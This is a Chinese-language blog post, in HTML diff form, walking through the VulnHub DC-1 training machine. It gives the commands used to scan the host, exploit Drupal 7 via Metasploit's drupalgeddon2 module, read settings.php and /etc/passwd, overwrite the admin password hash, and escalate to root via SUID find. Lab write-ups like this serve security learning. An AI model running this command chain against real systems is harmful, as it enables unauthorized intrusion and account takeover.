@@ -1,0 +1,694 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <title>
+    VulnHubDC—DC-1靶场 |
+    
+    Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="VulnHubDC—DC-1靶场配置下载地址 左上角： 文件-&gt;打开，导入文件选择下载的文件 在网络里面进行如下配置：  如下所示就是成功了：  打靶机 因为选择net模式，可以查看和主机同一网络下的ip   192.168.205.128 是自己的ip 1，2，254都是网关，所以靶机就是 192.168.205.136  端口扫描  12┌──(root㉿Sinead)-[&#x2F;home&#x2F;k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHubDC—DC-1靶场">
+<meta property="og:url" content="https://hanggerui88.github.io/2024/04/18/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/VulnHubDC%E2%80%94DC-1%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="VulnHubDC—DC-1靶场配置下载地址 左上角： 文件-&gt;打开，导入文件选择下载的文件 在网络里面进行如下配置：  如下所示就是成功了：  打靶机 因为选择net模式，可以查看和主机同一网络下的ip   192.168.205.128 是自己的ip 1，2，254都是网关，所以靶机就是 192.168.205.136  端口扫描  12┌──(root㉿Sinead)-[&#x2F;home&#x2F;k">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUy3.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUyo.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/17/hRSL.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUE9.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUGR.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUHS.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUJI.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hV3X.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hUYG.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hV0o.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hV3F.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hVM8.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hVOw.png">
+<meta property="og:image" content="https://i.niupic.com/images/2024/04/18/hVTK.jpg">
+<meta property="article:published_time" content="2024-04-18T09:00:54.000Z">
+<meta property="article:modified_time" content="2024-04-18T11:24:34.994Z">
+<meta property="article:author" content="hanggerui88">
+<meta property="article:tag" content="VulnHubDC—DC-1靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.niupic.com/images/2024/04/18/hUy3.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.1.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('load', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.jpg" alt="VulnHubDC—DC-1靶场">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>VulnHubDC—DC-1靶场</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-渗透学习/VulnHubDC—DC-1靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/04/18/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/VulnHubDC%E2%80%94DC-1%E9%9D%B6%E5%9C%BA/" class="article-date-link">
+    <time datetime="2024-04-18T09:00:54.000Z" itemprop="datePublished">2024-04-18</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1><span id="vulnhubdcdc-1靶场">VulnHubDC—DC-1靶场</span></h1><h2><span id="配置">配置</span></h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1-1,292/#download">下载地址</a></p>
+<p>左上角：</p>
+<p>文件-&gt;打开，导入文件选择下载的文件</p>
+<p>在网络里面进行如下配置：</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hUy3.png"></p>
+<p>如下所示就是成功了：</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hUyo.png"></p>
+<h2><span id="打靶机">打靶机</span></h2><ul>
+<li>因为选择net模式，可以查看和主机同一网络下的ip</li>
+</ul>
+<p><img src="https://i.niupic.com/images/2024/04/17/hRSL.png"></p>
+<p>192.168.205.128 是自己的ip</p>
+<p>1，2，254都是网关，所以靶机就是 192.168.205.136</p>
+<ul>
+<li>端口扫描</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Sinead)-[/home/kail/Desktop/tool/fscan]</span><br><span class="line">└─# ./fscan -h 192.168.205.136 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.niupic.com/images/2024/04/18/hUE9.png"></p>
+<p>开启了 22 和80 端口</p>
+<ul>
+<li>查看使用了什么服务</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Sinead)-[/home/kail/Desktop/tool/WhatWeb]</span><br><span class="line">└─# ./whatweb -v 192.168.205.136           </span><br><span class="line">WhatWeb report for http://192.168.205.136</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.136</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Wed, 17 Apr 2024 22:53:19 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Wed, 17 Apr 2024 22:53:19 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1713394399&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2278</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br><span class="line"></span><br><span class="line">                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里开启的<font color="cornflowerblue">Drupal 7   cms </font></p>
+<ul>
+<li>metasploit-framework(也就是msf)</li>
+</ul>
+<blockquote>
+<p>启动不了可以先删除:</p>
+<p>apt remove metasploit-framework</p>
+<p>然后在下载一次：</p>
+<p>apt install metasploit-framework</p>
+</blockquote>
+<p>1.要先配置数据库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>
+
+<p>2.使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">//获取 meterpreter 会话</span><br><span class="line"></span><br><span class="line">search drupal </span><br><span class="line">//查找模块</span><br><span class="line"></span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line">//看需要配置的选项</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.niupic.com/images/2024/04/18/hUGR.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.205.136   </span><br><span class="line">//目标IP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rport:   因为这里 端口已经默认80就不需要在设置</p>
+<p>targeturl:   我们也不是本地安装的durpal，不用设置</p>
+<p>lhost  : 自己的ip 没有问题，不用更改</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell  </p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hUHS.png"></p>
+<p>弄成交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>查看flag1 ，提示我们看配置文件</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hUJI.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -iname *settings.php* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给出了数据库信息</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hV3X.png"></p>
+<ul>
+<li>破解密码</li>
+</ul>
+<p>尝试hashcat破解，失败了</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hUYG.png"></p>
+<p>细看，是格式不太一样</p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hV0o.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">S<span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">S<span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">S<span class="variable">$C33783772bRXEx1aCsvY</span>.dqgaaSu76XmVlKrW9Qu8IQlvxHlmzLf</span></span><br><span class="line">//官方案例</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>忘记Drupal的管理员密码的解决办法<br>方法一：</p>
+<p>可以新注册一个用户，密码记住了，然后通过phpmyadmin这样的可视化mysql管理工具到users表里把加密后的密码拷到admin的密码里。</p>
+<p>方法二：这是drupal提供的最原生的方法</p>
+<p>在windows下，打开命令行客户端（cmd），切换到Drupal7项目所在的目录，敲入以下命令：</p>
+<p>php scripts&#x2F;password-hash.sh admin</p>
+<p>输出：</p>
+<p>password: admin                 hash: $S$DMtruNEVmqWoqhlPwTlnFzwyBRFgQwXUfppe9pW1RqqXlMy97tzA</p>
+<p>然后到数据库中，查users表，找到对应的用户名，修改密码，将上述的hash值复制到密码字段，保存即可。</p>
+</blockquote>
+<p>找 password-hash.sh</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -iname *password-hash.sh* 2&gt;/dev/null</span><br><span class="line">find / -iname *password-hash.sh* 2&gt;/dev/null</span><br><span class="line">/var/www/scripts/password-hash.sh</span><br><span class="line">www-data@DC-1:/var/www$ cat /var/www/scripts/password-hash.sh</span><br><span class="line">cat /var/www/scripts/password-hash.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给了使用范例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Example:      &#123;$script&#125; &quot;mynewpassword&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php /var/www/scripts/password-hash.sh 1234</span><br><span class="line">php /var/www/scripts/password-hash.sh 1234</span><br><span class="line"></span><br><span class="line">password: 1234          hash: $S$DXoFkNeI/g5F3c.BRkFLLvdFCMQNMEKAkKDW/fQv1h6kjWCaskdc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进入mysql，更改admin密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;update users set pass = &quot;$S$DXoFkNeI/g5F3c.BRkFLLvdFCMQNMEKAkKDW/fQv1h6kjWCaskdc&quot; where name = &#x27;admin&#x27; ;</span><br></pre></td></tr></table></figure>
+
+<p>进入首页登录，flag3在content里面模拟 </p>
+<p><img src="https://i.niupic.com/images/2024/04/18/hV3F.png"></p>
+<p>根据提示，获得flag4：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.niupic.com/images/2024/04/18/hVM8.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd  /home/flag4</span><br></pre></td></tr></table></figure>
+
+<p>获得提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>提权</li>
+</ul>
+<p>因为这里有find，所以先看看find有没有suid权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>-perm -u=s</code>: 这是用来指定搜索条件的选项。<code>-perm</code> 用于匹配指定权限的文件，<code>-u=s</code> 表示搜索具有 SetUID 权限的文件。</li>
+<li><code>-type f</code>: 这是进一步的限制条件，指定只搜索普通文件（即非目录、非链接等）。</li>
+</ul>
+</blockquote>
+<p><img src="https://i.niupic.com/images/2024/04/18/hVOw.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/bash&quot; -p \;</span><br><span class="line"></span><br><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.niupic.com/images/2024/04/18/hVTK.jpg"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://hanggerui88.github.io/2024/04/18/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/VulnHubDC%E2%80%94DC-1%E9%9D%B6%E5%9C%BA/" data-id="clv7lhzws0003fshq4nw1ci28" data-title="VulnHubDC—DC-1靶场" class="article-share-link">Share</a>
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VulnHubDC%E2%80%94DC-1%E9%9D%B6%E5%9C%BA/" rel="tag">VulnHubDC—DC-1靶场</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/banner.jpg" data-sizes="auto" alt="渗透学习-2-Multimaster" class="lazyload">
+          
+        
+        <a href="/2024/04/20/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-Multimaster/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            渗透学习-2-Multimaster
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.jpg" data-sizes="auto" alt="渗透学习-1-forest" class="lazyload">
+        
+      
+      <a href="/2024/04/07/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-forest-1/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          渗透学习-1-forest
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">VulnHubDC—DC-1靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">打靶机</span></a></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="hanggerui88" class="lazyload">
+  <div class="sidebar-author-name">hanggerui88</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+</div>
